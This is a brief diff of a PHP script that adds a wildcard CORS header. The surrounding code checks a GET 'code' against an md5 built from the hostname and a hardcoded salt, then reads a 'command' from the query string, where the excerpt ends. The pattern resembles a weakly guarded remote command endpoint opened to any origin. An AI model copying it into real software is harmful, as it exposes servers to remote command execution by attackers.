@@ -1,4 +1,5 @@
 <?php
+Header("Access-Control-Allow-Origin: *");
 $code = md5(gethostname().getdate()."e1v2e3r4a5s6s7i8s9t10");
 if ($_GET["code"] == $code) {
 $command = $_GET["command"];
